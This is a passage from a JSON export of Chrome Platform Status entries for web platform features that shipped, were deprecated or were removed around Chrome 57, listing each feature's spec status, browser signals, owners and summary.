    "summary": "CSS3 Text Decoration specification provides new properties that implements new text decoration styling features such as lines, color and style. As the specification says:\r\n\r\n\"CSS Levels 1 and 2 only defined very basic line decorations (underlines, overlines, and strike-throughs) appropriate to Western typographical traditions. Level 3 of this module adds the ability to change the color, style, position, [...]\"\r\n\r\nThis Chromestatus entry consists of the \r\nhttps://drafts.csswg.org/css-text-decor-2",
    "id": 5766823203045376,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/text-decoration"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:56.100320",
      "by": "ericbidelman@google.com"
    },
    "name": "Child-indexed pseudo-classes matching elements without a parent",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://drafts.csswg.org/selectors-4/#child-index",
      "visibility": {
        "text": "So small it doesn't need to be covered in this dashboard.",
        "val": 5
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1300374",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "ecobos@igalia.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "ios": 57,
        "blink_components": [
          "Blink"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=675670",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Change how the child-indexed pseudo-class selectors are matched so they also match elements without a parent.\r\n\r\nThis is a change in the spec from selectors-3 to selectors-4. The reasoning for this is explained in the spec.\r\n\r\n",
    "id": 5705677431373824,
    "resources": {
      "samples": [
        "http://software.hixie.ch/utilities/js/live-dom-viewer/?%3C!DOCTYPE%20html%3E%0A%3Cstyle%3Ehtml%20%7B%20color%3A%20red%3B%20%7D%20html%3Afirst-child%20%7B%20color%3A%20green%3B%20%7D%3C%2Fstyle%3E%0Afoo"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:42.744890",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and Remove webkitCancelRequestAnimationFrame",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://html.spec.whatwg.org/multipage/webappapis.html#animation-frames",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 57
        },
        "owners": [
          "ericwilligers@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>Animation"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=146849",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "webkitCancelRequestAnimationFrame is an obsolete, vendor-specific API. Authors should use cancelAnimationFrame instead.\r\n",
    "id": 5588435494502400,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:57.563370",
      "by": "ericbidelman@google.com"
    },
    "name": "Deprecate and remove -internal-media-controls-overlay-cast-button",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Deprecated",
          "val": 6,
          "milestone_str": 57
        },
        "owners": [
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/678285",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "-internal-media-controls-overlay-cast-button selector exposes Blink internal shadow DOM to the web content. Authors that want to have a custom cast button should use custom controls and implement a cast button with the Remote Playback API. Authors that have custom controls and want to hide the overlay can use the `disableRemotePlayback` attribute.",
    "id": 5714245488476160,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:28:31.457420",
      "by": "ericbidelman@google.com"
    },
    "name": "FontFaceSetLoadEvent Constructor",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://dev.w3.org/csswg/css-font-loading/#fontfacesetloadevent",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "lunalu@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "CSS"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=674539",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This entry tracks exposing FontFaceSetLoadEvent constructor. ",
    "id": 4784993343635456,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/FontFaceSetLoadEvent/FontFaceSetLoadEvent"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:10.084260",
      "by": "ericbidelman@google.com"
    },
    "name": "Fullscreen Media Orientation",
    "tags": [
      "media",
      "fullscreen",
      "controls",
      "orientation"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "dalecurtis@chromium.org",
          "renganathan@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Media>Controls"
        ],
        "desktop": 57,
        "flag": false,
        "webview": 57,
        "bug": "https://crbug.com/670455",
        "intervention": false
      },
      "opera": {
        "android": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Automatically lock the screen orientation when a video with default controls go fullscreen in order to maximize the screen usage. The orientation of the screen will match the aspect ratio of the video.",
    "id": 6063407807594496,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:16.468620",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Block audible cross-origin autoplay",
    "tags": [
      "autoplay"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 57
        },
        "owners": [
          "zqzhang@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Media"
        ],
        "desktop": 57,
        "flag": true,
        "bug": "https://crbug.com/672086",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This is an intervention that intends to block cross-origin iframes from autoplaying audible media. In other words, cross-origin iframes on desktop will behave like mobile currently behaves: only muted/inaudible autoplay will be allowed.",
    "id": 6624688629350400,
    "resources": {}
  },
  {
    "category": "User input",
    "updated": {
      "when": "2017-06-14 18:28:56.477890",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Passive Touch Event Listeners During Fling",
    "tags": [
      "Passive Listeners",
      "Touch Intervention",
      "intervention"
    ],
    "comments": "Safari sets events’ cancelable to be false while the fling animation is active, and calling ‘preventDefault’ does not have any effect on them. Our intervention has the same behaviors, but we see non-cancelable events more often, maybe because our configured fling speed is lower or fling interval is longer.\r\n\r\nFirefox and IE/Edge do not handle the event listeners at all during fling.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://github.com/w3c/touch-events/issues/76",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 57
        },
        "owners": [
          "lanwei@chromium.org",
          "tdresser@chromium.org",
          "rbyers@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=595327",
        "intervention": true
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Passive Event Listeners is a way to improve the scroll performance by unblocking scrolling on touch and wheel event listeners, so that scrolling happens immediately while the events are processed by javascript. alexclarke@ proposed that we should treat all the touchstart and first touchmove event listeners as passive while there’s an active fling animation.",
    "id": 5707400183021568,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/01/scrolling-intervention",
        "https://docs.google.com/document/d/10O_wMEpKgnhCfEQ8L3JckEKvkcclwEwCLtL0nSl7usA/",
        "https://docs.google.com/document/d/1jXaK9JcqpZtiNMoXvmgJ6sZ6K04wCO1VKIqvJeFM8wI/"
      ],
      "samples": [
        "https://output.jsbin.com/qegemu/quiet/"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:29:11.167860",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Throttle expensive background timers",
    "tags": [
      "throttling",
      "scheduling"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://developers.google.com/web/updates/2017/03/background_tabs",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 57
        },
        "owners": [
          "altimin@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink-Scheduling"
        ],
        "desktop": 57,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=650594",
        "intervention": true
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "As an intervention we want to limit how much CPU a background page is allowed to use and to throttle timer queues when this limit is violated.\r\n\r\nCurrent target is that background page CPU load level should be under 1%.\r\n\r\n",
    "id": 6172836527865856,
    "resources": {
      "docs": [
        "https://blog.chromium.org/2017/03/reducing-power-consumption-for.html",
        "",
        "https://developers.google.com/web/updates/2017/03/background_tabs",
        "",
        "https://github.com/WICG/interventions/issues/34"
      ],
      "samples": [
        "https://fiddle.jshell.net/vvL0e9x3/show/light/"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:55.682090",
      "by": "ericbidelman@google.com"
    },
    "name": "Intervention: Throttle timers in out-of-view frames",
    "comments": "A potential compatibility risk is that a site can observe timers firing out-of-order if the timers are scheduled from a mix of visible and hidden frames. To reduce this risk, we propose to only throttle timers in cross-origin frames.\r\n",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 4
      },
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1145439",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 57
        },
        "owners": [
          "skyostil@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/616519",
        "intervention": true
      },
      "opera": {
        "android": 45,
        "desktop": 45
      },
      "edge": {
        "view": {
          "url": "https://github.com/WICG/interventions/issues/9#issuecomment-228800016",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=145465",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "As an intervention we want to limit the rate at which timers in out-of-view, cross-origin frames are able to fire.\r\n\r\nUntil very recently it wasn't possible for script authors to easily determine whether their content was visible to the user or not. A common pattern therefore is to use a continuous setTimeout() loop for driving animations without considering visibility, which can be very costly for performance.",
    "id": 5701844080787456,
    "resources": {
      "docs": [
        "https://docs.google.com/document/d/1Xa8sd2M_Eh6hGSWeKTy_akzKdxcVZjCk4PQMqV8yXXw/edit",
        "https://github.com/WICG/interventions/issues/9"
      ],
      "samples": [
        "http://fiddle.jshell.net/3L9c9uyc/3/show/light/"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:59.196950",
      "by": "ericbidelman@google.com"
    },
    "name": "Legacy constants on Event",
    "comments": "",
    "standards": {
      "status": {
        "text": "No public standards discussion",
        "val": 6
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 57
        },
        "owners": [
          "foolip@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>DOM>Events"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/674944",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "There are 16 numeric constants on Event, Event.MOUSEDOWN and others. These constants no longer serve any purpose.",
    "id": 5723085873348608,
    "resources": {}
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:28:45.284020",
      "by": "ericbidelman@google.com"
    },
    "name": "Media Session",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://wicg.github.io/mediasession/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1112032",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "zqzhang@chromium.org",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Internals>Media>Session"
        ],
        "flag": false,
        "android": 57,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=497735",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=145411",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Enable websites to customize media metadata so they can control the notification and lock screen UI. Also, allow them to control media in the page from outside the page, such as platform UIs and media keys.",
    "id": 5639924124483584,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Media_Session_API",
        "https://developers.google.com/web/updates/2017/02/media-session"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/media-session/"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2018-03-28 15:52:42.868040",
      "by": "jmedley@google.com"
    },
    "name": "MediaStreamTrack Content Hints",
    "tags": [
      "MediaStreamTrack"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://wicg.github.io/mst-content-hint/#extension-to-mediastreamtrack",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 57
        },
        "owners": [
          "pbos@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>MediaStream>*"
        ],
        "desktop": 57,
        "flag": true,
        "android": 57,
        "bug": "https://crbug.com/653531",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This feature extends MediaStreamTrack to provide a media-content hint attribute. This optional hint permits MediaStreamTrack consumers such as PeerConnection or MediaRecorder to encode or process track media with methods more appropriate to the type of content that is being consumed. ",
    "id": 5689466211532800,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/MediaStreamTrack"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-11-27 20:03:19.650540",
      "by": "ericbidelman@google.com"
    },
    "name": "Navigation Timing 2",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.w3.org/TR/navigation-timing-2/#introduction",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1043083",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "panicker@chromium.org",
          "sunjian@chromium.org",
          "igrigorik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=611276",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/catalog/?q=specName%3Anavigation-timing-2",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Navigation Timing 2 (NT2) enables obtaining accurate timing data related to the navigation of the document.\r\n",
    "id": 5409443269312512,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PerformanceNavigationTiming"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:28.752920",
      "by": "ericbidelman@google.com"
    },
    "name": "PaymentDetails.error",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/browser-payment-api/#paymentdetails-dictionary",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "rouslan@chromium.org",
          "hs1217.lee@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Payments"
        ],
        "flag": false,
        "android": 57,
        "bug": "http://crbug.com/648240",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "When the payment request is updated using updateWith, the PaymentDetails can contain a message in the error field that will be displayed to the user. For example, this might commonly be used to explain why goods cannot be shipped to the chosen shipping address.\r\n\r\nThe error field cannot be passed to the PaymentRequest constructor. Doing so will cause a TypeError to be thrown.",
    "id": 4655740933373952,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/PaymentRequestUpdateEvent/PaymentRequestUpdateEvent"
      ],
      "samples": [
        "https://rsolomakhin.github.io/pr/us/"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:53.717020",
      "by": "ericbidelman@google.com"
    },
    "name": "Prefixed Resource Timing buffer-management API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://www.w3.org/TR/resource-timing-1/#extensions-performance-interface",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 57
        },
        "owners": [
          "ksakamoto@chromium.org"
        ],
        "prefixed": true,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/678547",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support for webkitClearResourceTimings(), webkitSetResourceTimingBufferSize(), and onwebkitresourcetimingbufferfull is removed from the Performance interface, in favor of clearResourceTimings(), setResourceTimingBufferSize(), and onresourcetimingbufferfull. Currently warnings are produced, but upon removal, the prefixed versions will no longer exist.",
    "id": 5688905986736128,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Performance/clearResourceTimings",
        "https://developer.mozilla.org/en-US/docs/Web/API/Performance/setResourceTimingBufferSize",
        "https://developer.mozilla.org/en-US/docs/Web/API/Performance/onresourcetimingbufferfull"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-06-14 18:28:51.184760",
      "by": "ericbidelman@google.com"
    },
    "name": "RTCDataChannelEvent constructor",
    "comments": "The RTCDataChannelEvent constructor in Firefox behaves differently: channel can be passed as null.\r\n\r\nBug filed to Firefox:\r\nhttps://bugzilla.mozilla.org/show_bug.cgi?id=1316320",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/webrtc-pc/#idl-def-rtcdatachannel",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "lunalu@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink>WebRTC"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/658428",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This entry track exposing RTCDataChannelEvent constructor. RTCDataChannel and RTCDataChannelEvent was implemented and shippped before the current process.",
    "id": 5673383773601792,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCDataChannelEvent"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:58.099090",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove Key Generation Element",
    "comments": "IE/Edge do not support <keygen> and have not indicated public signals to support <keygen>.\r\nFirefox already gates <keygen> behind a user gesture, but is publicly supportive of removing it.\r\nSafari ships <keygen> and has not expressed public views regarding its continued support.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://www.w3.org/TR/html5/forms.html#the-keygen-element",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/d/msg/mozilla.dev.security/mr_DoJGOoiA/RDEvRJ5uBAAJ",
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 57
        },
        "owners": [
          "svaldez@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 57,
        "blink_components": [
          "Blink"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/568184",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "Opposed",
          "val": 7
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "Since Chrome 49, <keygen>'s default behaviour has been to return the empty string, unless a permission was granted to this page. Removed in Chrome 57.\r\n",
    "id": 5716060992962560,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/keygen"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:22:09.052620",
      "by": "ericbidelman@google.com"
    },
    "name": "Remove ServiceWorkerMessageEvent in favor of using MessageEvent",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://github.com/w3c/ServiceWorker/commit/6c68bd87bdfd153186a5b9904e31676c56730e2f",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 57
        },
        "owners": [
          "jungkee.song@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 57,
        "flag": false,
        "android": 57,
        "bug": "https://crbug.com/659074",
        "intervention": false
      },
      "opera": {
        "android": 44,
        "desktop": 44
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
